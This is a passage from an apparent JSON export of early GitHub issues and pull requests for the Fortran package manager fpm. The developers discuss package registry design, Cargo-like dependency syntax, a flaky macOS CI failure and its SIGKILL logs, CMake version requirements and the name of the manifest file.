generated website, and use this \"registry JSON\" to print info about packages, what packages depend on, etc.\n\nThen later on, to take this to implement the full #35, the only thing missing really is just hosting of tarballs. Everything else I think can be reused.\nThe above plan also allows other people (companies) to host their own registry\n\nThe above plan can be started by simply:\n\ncreate an fpm_registry with the minimal JSON\nadd a CI that takes this JSON and creates \"registry JSON\" and hosts it online\nupdate fpm to download and work with this \"registry JSON\"\n\nThese are three simple steps that I can even help implement, I've done something similar for LFortran. This can then be naturally expanded to also create a nice website."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 14:20:14+00:00",
                    "text": "I like that plan. It's usable to the point that even if we don't end up moving to a tarball hosting registry, I don't think anybody would even mind."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:44:57+00:00",
                    "text": "I like this plan as well. So actually this minimal registry is not what's read by fpm, but is read by another program that outputs the \"production\" registry with complete information. This is a good idea because then we don't have to assume ahead of time what is all the metadata that we'll need.\nI realize now that this issue is a step 2 from a 3-step #33. I will write there for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:36:37+00:00",
                    "text": "Now when #33 is (mostly) done, let's tackle this issue.\n@milancurcic, @everythingfunctional, let's keep the (centralized) registry in a separate repository. How should it be named? Some ideas:\nhttps://github.com/fortran-lang/package-registry\nhttps://github.com/fortran-lang/fpm-package-registry\nhttps://github.com/fortran-lang/fpm-registry\nI don't really have a preference. This repository will have a JSON or rather a TOML file where people will submit their packages using a GitHub PR. This file will only contain the name of the package, the version and url (everything else is redundant, so should not be there). There can also be the \"latest\"/\"development\" version that would simply download the latest git (and thus things like description can change in this latest version, so that should not be part of this TOML file, but rather only in the upstream repository inside fpm.toml, and we process it automatically).\nWe'll then build CI jobs to process this JSON/TOML file to:\n\ncreate rich metadata JSON file that collects things like descriptions, license, website, logo url (later on), etc. by downloading the package (ensuring it actually downloads...) and reading the fpm.toml inside it.\nadd a section to our fortran-lang.org website (ccing @LKedward) that would probably use the json metadata from the previous point\nimplement fpm search that would use the json metadata from the first bullet point to implement search (so that you can search through the description of the package, not just the name)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 22:46:58+00:00",
                    "text": "Looks good. I like fpm-registry.\nI'm unclear about versions. If this file includes the version number, which version is it? The latest? Perhaps all versions that are fpm-enabled? Or should the version metadata be the responsibility of the package itself?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 22:50:22+00:00",
                    "text": "Re version: all versions that are fpm enabled. This is hard to figure out automatically, as typically old versions are just some git tags, and maybe not all of them are valid / working, etc. So I figured each version has to be explicitly specified, and one of the version can be \"latest git commit\"."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:03:15+00:00",
                    "text": "I like fpm-registry.\nI worry a bit about having to specify every version. But as this is more of a stop-gap measure, I guess it's ok."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:07:59+00:00",
                    "text": "Ok, I created https://github.com/fortran-lang/fpm-registry and gave access to everybody with push access. We can start submitting PRs against that repository to get it up."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:21:17+00:00",
                    "text": "We can continue the discussion at fortran-lang/fpm-registry#1 and other issues there."
                }
            ]
        },
        {
            "number": 33,
            "user": "certik",
            "date": "2020-01-31 04:18:26+00:00",
            "title": "Decentralized package management",
            "text": "Rust allows the packages to be decentralized, they do not have to be listed at https://crates.io/.\nThe Go language does not even have a centralized package registry at all, see this blog post that explains it in the section \"Package Management\":\nhttps://nullprogram.com/blog/2020/01/21/\n\nModules are named by a module path that includes its network location. This means there\u2019s no land grab for popular module names.\n\nI don't like the Go's model that the name of the package is the url, I prefer the Rust model where a package has a simple name, but you specify where it can be downloaded. The end result is the same. (Overall, the Rust package management seems much more thought out, and it seems they fixed the issues that Go is tackling long time ago.)\nI want to implement the same approach for fpm. That will allow us to build an ecosystem of packages for Fortran, without a \"goldrush\" to reserve a popular package name in a centralized registry. Then, as we have a healthy ecosystem of packages, we can add a centralized registry later.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 18:45:30+00:00",
                    "text": "Overall I like this direction. However I'm confused about how this works in practice. Perhaps it's just a terminology issue.\nLike PyPI, Crates serves both as a registry (metadata), and code distribution.\nI agree that it's not feasible for fpm to host and distribute code. It's a huge ordeal and technical challenge.\nHowever, do you also mean that fpm wouldn't have a centralized metadata registry? If yes, how would a newcomer to Fortran and fpm search for packages? It seems to me that if you don't have some centralized metadata registry, the user would need to know what package they need and how to download it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 19:44:11+00:00",
                    "text": "I think it's a step by step process, we start with the step 1. below, then we progress to step 2. and then to step 3.:\n\n\nThis issue #33: indeed there is no centralized metadata registry. The advantage is that there is no \"goldrush\" to reserve popular names in a centralized registry. Initially there is no package search (newcomers must know the package name), but I can imagine actually creating a search --- all we need for people to submit urls of packages out there, and since each is using fpm.toml, we can then create a search of those decentralized packages.\n\n\nIssue #34: minimal centralized registry. Allows a natural fpm search capability.\n\n\nIssue #35: both registry and code distribution.\n\n\nIf step 1. is fully developed, there can actually be a \"decentralized package registry\". It would work just like described in step 2. (see the issue #34 for details), except that there would not be a centralized name for a package, so people could submit various packages (as url) that can have the same name. Then fpm search would give you all the packages with urls to put into your fpm.toml. We can curate this list as a community to prevent spam and malicious code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:51:08+00:00",
                    "text": "Coming from #34, let's discuss how the step 1 (no centralized registry) works. This means we don't need fpm search and fpm list.\nLet's say I just want to fpm install with datetime-fortran as a dependency. I know the name of the package. I don't (and shouldn't) know the URL of the package.\n@certik How does this work? It seems to me that we need some metadata even at this stage.\nOr is the user expected to enter something like:\n[dependencies]\nname = \"datetime\"\nurl = \"https://github.com/wavebitscientific/datetime-fortran\"\nto their fpm.toml?\nBoth approaches seem okay to me for now (latter is simpler), I'm just not clear what's your idea how this works."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:11:38+00:00",
                    "text": "The step 2 in #34 is what we should eventually do, and then step 3 in #35. It looks like we got agreement on both.\nYou can only install datetime-fortran (btw, it should probably just be called datetime) without knowing the url at the step 2., because you need the registry to get the url.\nSo let's start with step 1 in this issue #33. In here I propose to do exactly what Cargo does. Say I want to use datetime in my program. Here are details about Cargo's syntax: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html, so let's do what they do:\nI would have this in my fpm.toml:\n[dependencies]\ndatetime = \"1.7.0\"\nOnce step 2 is implemented, then fpm would have a default registry, and you can also specify your own registry either on a command line or explicitly:\n[dependencies]\ndatetime = { version = \"1.7.0\", registry = \"my-registry\" }\nUntil then, in this step 1, we do not have a registry, so you have to also tell it where it can download the datetime package directly. As explained at the webpage, Cargo only uses the version field if it downloads from a registry, otherwise it ignores it if it downloads it directly from a git repository or a local path. We can start with that approach, if we need more, we can modify that behavior. So here is how you would do it:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nHowever, since we want to move to a registry, and since most projects follow the convention of prefixing the version by v in the git tag (I do in all my projects, and I noticed you do too), I am proposing this natural extension of what Cargo does:\n\nIf git and version is specified, it will checkout a tag named v + version from that git repository\n\nSo with this extension, you would do:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nAnd then later once we move to a registry, you just remove the git field, but keep the version and it would do the right thing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 16:27:04+00:00",
                    "text": "Cargo actually has a different meaning for this:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nThis means that when working in this package, it will download the latest master version of datetime, but for a package that depends on this one, the transitive dependency is version 1.7.0 of datetime from the default registry.\nI'm not saying we definitely shouldn't do what you're suggesting, but if we do it will preclude us from ending up with the same functionality as Cargo. It would also impose a tagging convention on people's repositories that will be unnecessary once we have a proper registry. Also, relying on git tags for official release version identifiers is wide open for abuse."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 16:51:00+00:00",
                    "text": "Perfect, this is what we're after as a first step:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nThis alone will already be a huge improvement over the current state of things.\nWe can work out the nuances of version and registry behavior as we go."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:53:16+00:00",
                    "text": "@everythingfunctional I am glad you noticed that. Let's not do my proposal then, just use tag. I think it is good enough and we will have a minimal registry soon anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:25:03+00:00",
                    "text": "@everythingfunctional, @milancurcic I think this issue is fixed now?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 20:36:40+00:00",
                    "text": "Yes, IMO this is good to close."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:06:28+00:00",
                    "text": "Yep, go ahead and close it."
                }
            ]
        },
        {
            "number": 32,
            "user": "certik",
            "date": "2020-01-28 06:37:38+00:00",
            "title": "Implement dependencies",
            "text": "Just like in Cargo.\nWe should work on this after #25 is fixed.",
            "comments": []
        },
        {
            "number": 31,
            "user": "certik",
            "date": "2020-01-28 06:34:52+00:00",
            "title": "Add tests for different build directories",
            "text": "We need to add more tests:\n\n test that the default directory is target (in some temporary directory)\n test other locations of the build directory (will require to construct relative paths in CMakeLists.txt)",
            "comments": []
        },
        {
            "number": 30,
            "user": "certik",
            "date": "2020-01-28 05:54:47+00:00",
            "title": "Cleanup the test program",
            "text": "",
            "comments": []
        },
        {
            "number": 29,
            "user": "certik",
            "date": "2020-01-28 01:55:16+00:00",
            "title": "Use Command::new() instead of Command::cargo_new()",
            "text": "This seems to actually fix the issue #16 as documented at:\nhttps://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255/6",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 02:02:34+00:00",
                    "text": "I need to figure out how to obtain the absolute path to fpm in a platform independent way, and then pass it in. But this approach seems to be able to fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 04:59:06+00:00",
                    "text": "Tests pass. I am now testing that this truly fixes the macOS bug at certik#14."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:34:37+00:00",
                    "text": "It works. I think this really fixed it! I am going to merge this and we'll watch it if it ever fails again."
                }
            ]
        },
        {
            "number": 28,
            "user": "certik",
            "date": "2020-01-25 17:44:14+00:00",
            "title": "Add Cargo.lock",
            "text": "This is the recommended approach for an application.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-25 18:29:18+00:00",
                    "text": "I was surprised by this, but indeed the docs recommend not committing Cargo.lock for a library and committing it for an application. Link for anybody like me who wondered about this:\nhttps://doc.rust-lang.org/cargo/faq.html#why-do-binaries-have-cargolock-in-version-control-but-not-libraries"
                }
            ]
        },
        {
            "number": 27,
            "user": "certik",
            "date": "2020-01-25 17:34:00+00:00",
            "title": "Install cmake using apt-get",
            "text": "",
            "comments": []
        },
        {
            "number": 26,
            "user": "certik",
            "date": "2020-01-18 17:31:51+00:00",
            "title": "Build in a target directory",
            "text": "Fixes #24.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-18 18:01:01+00:00",
                    "text": "I just need to fix it up on macOS and Windows."
                }
            ]
        },
        {
            "number": 25,
            "user": "certik",
            "date": "2020-01-18 15:05:48+00:00",
            "title": "Build in temporary directory for tests",
            "text": "After #24 and #31 is fixed, set the --target-dir to a temporary directory for tests. That way multiple tests can reuse the same source directory for different tests, in parallel.",
            "comments": []
        },
        {
            "number": 24,
            "user": "certik",
            "date": "2020-01-18 15:05:05+00:00",
            "title": "Put everything into target/",
            "text": "Put the CMakeLists.txt into target/, and ensure the source directory is not polluted at all.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 06:35:12+00:00",
                    "text": "The basic issue is fixed, but more tests need to be added (#31)."
                }
            ]
        },
        {
            "number": 23,
            "user": "certik",
            "date": "2020-01-18 15:00:29+00:00",
            "title": "Implement --target-dir",
            "text": "",
            "comments": []
        },
        {
            "number": 22,
            "user": "certik",
            "date": "2020-01-18 06:39:01+00:00",
            "title": "Parse fpm.toml",
            "text": "",
            "comments": []
        },
        {
            "number": 21,
            "user": "certik",
            "date": "2020-01-18 00:02:55+00:00",
            "title": "Print the full Rust stacktrace on error",
            "text": "",
            "comments": []
        },
        {
            "number": 20,
            "user": "certik",
            "date": "2020-01-17 23:36:35+00:00",
            "title": "macOS: repeat the test up to 2x if it fails",
            "text": "This is a workaround for #16. It turns out that if the executable fails\nto run, just rerunning all tests typically fixes it.",
            "comments": []
        },
        {
            "number": 19,
            "user": "certik",
            "date": "2020-01-17 20:30:08+00:00",
            "title": "CI repr 6",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-17 20:54:20+00:00",
                    "text": "My apologies, meant to create this one: certik#5"
                }
            ]
        },
        {
            "number": 18,
            "user": "certik",
            "date": "2020-01-16 05:56:24+00:00",
            "title": "Better reporting on terminated processes",
            "text": "This will eventually help fix #16.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-16 06:45:48+00:00",
                    "text": "I think this PR works as expected. In https://github.com/fortran-lang/fpm/pull/18/checks?check_run_id=392603247 it reports more information about the failure due to #16:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nstatus: signal: 9\nstdout: \nstderr: \n##[error]thread 'test_2' panicked at 'INTERRUPTED with signal: 9', tests/cli.rs:35:21"
                }
            ]
        },
        {
            "number": 17,
            "user": "certik",
            "date": "2020-01-15 22:18:24+00:00",
            "title": "Candidate packages to get working",
            "text": "Here are a few good candidate packages to get working with fpm first, that are relatively simple (and so possible to package soon), yet very useful.\nPure Fortran (Simple)\n\n https://github.com/wavebitscientific/functional-fortran\n https://github.com/jacobwilliams/bspline-fortran\n https://github.com/fortran-lang/stdlib\n https://github.com/astrofrog/fortranlib\n https://github.com/certik/fortran-utils/\n https://github.com/wavebitscientific/datetime-fortran\n https://github.com/jacobwilliams/pyplot-fortran\n\nPure Fortran (More Complex)\n\n https://github.com/Reference-LAPACK/lapack\n https://github.com/opencollab/arpack-ng\n https://github.com/jacobwilliams/json-fortran\n https://github.com/jacobwilliams/Fortran-Astrodynamics-Toolkit\n https://github.com/Goddard-Fortran-Ecosystem/pFUnit\n https://github.com/szaghi/StringiFor (Lots of dependencies)\n\nFortran with non-Fortran dependencies\n\n https://github.com/scivision/h5fortran\n https://github.com/scivision/nc4fortran\n https://github.com/SHTOOLS/SHTOOLS\n https://github.com/unidata/netcdf-fortran\n\nAnd obviously any other more complicated package from https://github.com/fortran-lang/stdlib/wiki/List-of-popular-open-source-Fortran-projects.\nAny other candidates?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-16 03:02:29+00:00",
                    "text": "I added nc4fortran and netcdf-fortran to the list."
                }
            ]
        },
        {
            "number": 16,
            "user": "certik",
            "date": "2020-01-15 15:02:32+00:00",
            "title": "The fpm binary gets interrupted at the CI (macOS)",
            "text": "There is a bug at our CI that I haven't been able to figure out yet. Here is an example of it: https://github.com/fortran-lang/fpm/runs/390475601.\nHere is what I know:\n\n\nIt only happens on macOS, never on Linux or Windows\n\n\nRestarting the build typically fixes it (sometimes it fails 2x or 3x in a row, but eventually it always passes)\n\n\nThe cargo test runs in parallel by default, so I set -j1 to run in serial. That seemed to improve how often it fails (although I could be wrong on that). It still fails sometimes however, so the actual bug is still there.\n\n\nThe error is:\n\n\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n\nWhich is caused by the assert_cmd package, which just uses the Rust's std::process::Command, when the output command did not succeed, but it also failed to retrieve the error code, which according to the documentation means the process was interrupted by the system (with some signal like SIGKILL).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-15 15:31:20+00:00",
                    "text": "And here it failed in master (https://github.com/fortran-lang/fpm/runs/391281163) after merging #15 that passed. So we have to figure this out."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 15:35:41+00:00",
                    "text": "Is there anybody with a Mac that can reproduce this locally?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:39:25+00:00",
                    "text": "I tried it on a macOS yesterday locally, and I can't reproduce it. So we have to Debug it at the CI itself (as I have done in #14), which is quite time consuming."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 06:48:29+00:00",
                    "text": "As reported in #18 (comment), the process gets interrupted with signal 9 (SIGKILL). I suspected that above, but it's nice to have a proof. For some reason macOS kills the fpm process."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 07:03:41+00:00",
                    "text": "This might be a bug at GitHub, so I reported it at https://github.community/t5/GitHub-Actions/GitHub-Actions-on-macOS-randomly-kill-my-test-program/m-p/43526#M5414."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 18:28:12+00:00",
                    "text": "I am trying to reliably reproduce this bug in certik#1."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:44:30+00:00",
                    "text": "One approach to fix this is to do cargo test || cargo test. An example where the first one fails, but the second one succeeds is https://github.com/certik/fpm/runs/396031403."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:56:03+00:00",
                    "text": "This is precisely the kind of issue I am a bit worried with Rust, that the toolchain is not mature enough and will produce binaries that do not work (but only sometimes!). The closest error that I was able to find is:\ngolang/go#19734"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-17 22:05:49+00:00",
                    "text": "But this likely has more to do with GitHub Actions than Rust itself. Neither you nor the person from the GitHub Forum could reproduce it locally, correct?\nI agree it's very important to have fpm work on all 3 major platforms, but I wonder if it's a bit too early to focus Mac OS work 100% of the time? Why not let it fail sometimes? We can manually trigger the build when it does fail."
                },
                {
                    "user": "certik",
                    "date": "2020-01-18 00:20:48+00:00",
                    "text": "I implemented a workaround in #20. The problem with GitHub Actions is that you cannot just restart a single build, you have to restart all the builds. The other issue is that it was already failing a lot with just 3 tests. Once we have hundreds of tests, it might end up failing all the time. For now the workaround implemented in #20 should make the CI robust enough for now. But we'll have to get back to this and fix it.\nThe reason I spent so much time on this is that I thought I can use \"bisection\" to create a minimal example that fails, and figure it out. But I failed. Essentially it's extremely unreliable to trigger the bug by submitting 20 commits. Sometimes they all pass, and sometimes they get 4 failures. And I haven't figured out a minimal example that can reliably trigger it in 20 runs. As I start removing things, the failures become less and less frequent.\nIf #20 doesn't give us reliable CI, then we can switch the macOS build to Azure pipelines or Travis-CI.\nBut having a reliable CI is a must."
                },
                {
                    "user": "certik",
                    "date": "2020-01-21 18:31:06+00:00",
                    "text": "I reported it in the Rust community also: https://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255"
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:35:21+00:00",
                    "text": "I think #29 fixed this issue."
                }
            ]
        },
        {
            "number": 15,
            "user": "certik",
            "date": "2020-01-15 05:42:54+00:00",
            "title": "Remove manual tests",
            "text": "Use \"cargo test\" instead.",
            "comments": []
        },
        {
            "number": 14,
            "user": "certik",
            "date": "2020-01-14 23:15:22+00:00",
            "title": "WIP: try to reproduce the error",
            "text": "",
            "comments": []
        },
        {
            "number": 13,
            "user": "certik",
            "date": "2020-01-14 21:20:21+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:39:55+00:00",
                    "text": "The Linux CI is currently broken at GitHub, but once they fix it, it should pass. The main problem that the macOS build was failing seems to be fixed by a571570. I am going to wait until the CI works again and rerun tests. Once they all pass, we can merge."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 23:08:53+00:00",
                    "text": "I tested almost 10x and the macOS built never failed, so I thought it was fixed. But now it failed twice in a row:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n...\n\nThe CI is killing the runner for some reason, but I don't know why."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 04:30:59+00:00",
                    "text": "The macOS bug is still there, but by restarting the tests it typically fixes itself, so I am going to merge this and we'll eventually figure out what is causing it."
                }
            ]
        },
        {
            "number": 12,
            "user": "certik",
            "date": "2020-01-14 20:47:50+00:00",
            "title": "Draft: See if we get a failure",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:14+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 11,
            "user": "certik",
            "date": "2020-01-14 20:42:36+00:00",
            "title": "Add Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:40:34+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 10,
            "user": "certik",
            "date": "2020-01-14 20:35:44+00:00",
            "title": "Prepare fpm to run on Windows using Rust tests",
            "text": "",
            "comments": []
        },
        {
            "number": 9,
            "user": "certik",
            "date": "2020-01-14 17:06:48+00:00",
            "title": "Run all tests using \"cargo test\" only",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 17:40:14+00:00",
                    "text": "Unfortunately there seem to be random errors on macOS of the type:\n---- test_help stdout ----\nthread 'test_help' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"--help\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\nstack backtrace:\n   0: backtrace::backtrace::libunwind::trace\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/libunwind.rs:88\n   1: backtrace::backtrace::trace_unsynchronized\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.40/src/backtrace/mod.rs:66\n   2: std::sys_common::backtrace::_print_fmt\n             at src/libstd/sys_common/backtrace.rs:77\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\n             at src/libstd/sys_common/backtrace.rs:61\n   4: core::fmt::write\n             at src/libcore/fmt/mod.rs:1028\n   5: std::io::Write::write_fmt\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libstd/io/mod.rs:1412\n   6: std::io::impls::<impl std::io::Write for alloc::boxed::Box<W>>::write_fmt\n             at src/libstd/io/impls.rs:141\n   7: std::sys_common::backtrace::_print\n             at src/libstd/sys_common/backtrace.rs:65\n   8: std::sys_common::backtrace::print\n             at src/libstd/sys_common/backtrace.rs:50\n   9: std::panicking::default_hook::{{closure}}\n             at src/libstd/panicking.rs:188\n  10: std::panicking::default_hook\n             at src/libstd/panicking.rs:202\n  11: std::panicking::rust_panic_with_hook\n             at src/libstd/panicking.rs:464\n  12: std::panicking::continue_panic_fmt\n             at src/libstd/panicking.rs:373\n  13: std::thread::local::fast::Key<T>::try_initialize\n  14: assert_cmd::assert::Assert::success::{{closure}}\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148\n  15: core::option::Option<T>::unwrap_or_else\n             at /rustc/73528e339aae0f17a15ffa49a8ac608f50c6cf14/src/libcore/option.rs:419\n  16: assert_cmd::assert::Assert::success\n             at /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:147\n  17: cli::test_help\n             at tests/cli.rs:9\n  18: cli::test_help::{{closure}}\n             at tests/cli.rs:6\n\nThis error only happens sometimes. So there might be some bug in the assert_cmd package on macOS."
                },
                {
                    "user": "certik",
                    "date": "2020-01-14 21:41:03+00:00",
                    "text": "Closing in favor of #13."
                }
            ]
        },
        {
            "number": 8,
            "user": "scivision",
            "date": "2020-01-14 16:43:19+00:00",
            "title": "cmake_minimum_required => 3.14",
            "text": "fpm/src/main.rs\n    \n    \n         Line 38\n      in\n      bf8ee01\n    \n    \n    \n    \n\n        \n          \n           cmake_minimum_required(VERSION 3.5.0 FATAL_ERROR) \n        \n    \n  \n\n\nThe CMake syntax used in this Rust script requires at least CMake 3.13.\nIn general in the Fortran stdlib we currently planned to use CMake 3.14 minimum.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 21:15:15+00:00",
                    "text": "Yes, it needs to be 3.14. Is the FATAL_ERROR needed? It seems to fail fatally even without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:34:02+00:00",
                    "text": "This raises a broader issue about how should we handle minimum CMake version in fpm.\nShould we set a fixed minimum cmake version for all packages brought in by fpm (even if they are okay with an earlier version)? This seems like an unnecessary overkill to me.\nOr, should we let cmake do the work and have individual package builds fail if user's cmake is inadequate? I like this better.\nAre there other approaches?"
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 07:21:52+00:00",
                    "text": "if you intend to communicate with CMake beyond simple command line interaction, there was a significant improvement in CMake 3.14 adding a file based API. That would avoid having to implement that twice for CMake < 3.14 and the deprecated CMake server, if such communication is necessary for fpm.\nThis would allow for example to introspect CMake projects that don't use fpm, but are used by fpm."
                },
                {
                    "user": "scivision",
                    "date": "2020-01-15 16:35:19+00:00",
                    "text": "In my opinion the FATAL_ERROR parameter to cmake_minimum_version() can be omitted. It does nothing for CMake releases less than about 15 years old, and those with CMake that old would have trouble building almost anything for the past few years."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 19:21:08+00:00",
                    "text": "@scivision thanks. (I can't believe I've been using CMake longer than 15 years, but it seems I have...)\nRegarding the minimal version, it requires 3.14 for Windows, and I was thinking of simply using that for now everywhere.\nOnce fpm is further along, let's revisit this. Down the road I actually think fpm should be able to build things on its own, just like Cargo does it, which would be a lot faster (since cmake's configure phase can be pretty slow).\nFor now I just want to get some minimal product working, then we'll carefully revisit all these decisions."
                }
            ]
        },
        {
            "number": 7,
            "user": "certik",
            "date": "2020-01-14 15:46:23+00:00",
            "title": "CI: Test on Windows",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 16:10:13+00:00",
                    "text": "Tests pass, so I'll merge this. Futher work needs to be done on Windows, but this is a start."
                }
            ]
        },
        {
            "number": 6,
            "user": "certik",
            "date": "2020-01-14 06:08:41+00:00",
            "title": "How to support packages that do not conform to our \"standard layout\" (to be specified...)",
            "text": "How to support packages that do not conform to our \"standard layout\" (to be specified...). Some examples of such a package would be reference Lapack, or Arpack. The way to do that is that we create a new repository, say certik/lapack.fpm, which will have fpm.toml, in there it would specify the url to the actual sources (https://github.com/Reference-LAPACK/lapack) and a build script, which would build the sources (using CMake in this case) and install them into some $PREFIX provided by fpm and fpm takes it from there. This approach also works for non Fortran packages --- the build script either builds it, or requires it from the system (where it can be provided by, e.g., Spack). Either way this is a clean way to hook this up into the fpm ecosystem.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:40:11+00:00",
                    "text": "Yes, I think fpm.toml for each project should include the exact commands that need to be executed to build the package, very much like we do in yml files for CI.\nThat said, until a need arises, I'd suggest that we take this approach for all packages, including those built with CMake, autotools, or plain Makefiles.\nIf we can make a package build in CI, we should be able to build it by fpm by making it execute commands specified in fpm.toml.\n\nThe way to do that is that we create a new repository, say certik/lapack.fpm\n\nDoes this even need to be a separate repo? Are you thinking about a repo that would be the registry of all fpm-supported packages, like what I described in #4 ?"
                }
            ]
        },
        {
            "number": 5,
            "user": "certik",
            "date": "2020-01-14 06:08:04+00:00",
            "title": "Naming of `fpm.toml`",
            "text": "Naming of fpm.toml. Cargo names Cargo.toml with capital C, and as explained in https://doc.rust-lang.org/cargo/faq.html#why-cargotoml, to \"ensure that the manifest was grouped with other similar configuration files in directory listings. Sorting files often puts capital letters before lowercase letters, ensuring files like Makefile and Cargo.toml are placed together.\" If we want to do the same, the candidates are Fpm.toml and FPM.toml. I think fpm.toml looks better. But using a capital letter would make it similar to CMakeLists.txt also. We might want to devise a different name or naming scheme. Any ideas?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:30:36+00:00",
                    "text": "If we consider fpm.toml, I like it better than either Fpm.toml or FPM.toml. I see little value in the sorting argument.\nIf I think of any better names than fpm.toml, I will write here, but I think fpm.toml is just fine."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-01-15 08:25:24+00:00",
                    "text": "If I get it correctly in the Rust world libraries/packages are called crates, and the package manager called Cargo is responsible for shipping these crates?\nIn line with the Rust naming, if you don't mind playing with some old Fortran terminology, crates would become decks (as in punched card decks), and the Fortran package manager would be a box/package/drawer/folder/cabinet/chest/case/dealer/dispenser/pile/loader/...?.... Unfortunately none of these words really ring. The  fpm.toml acronym is also easy enough to remember.\nFrom Wikipedia:\n\n...a box of computer programs in punched card form from the early 1970s. The deck in the middle shows what a program deck looked like after extensive editing and debugging. The cardboard box was originally used to ship blank cards and held 2000 cards."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 05:22:26+00:00",
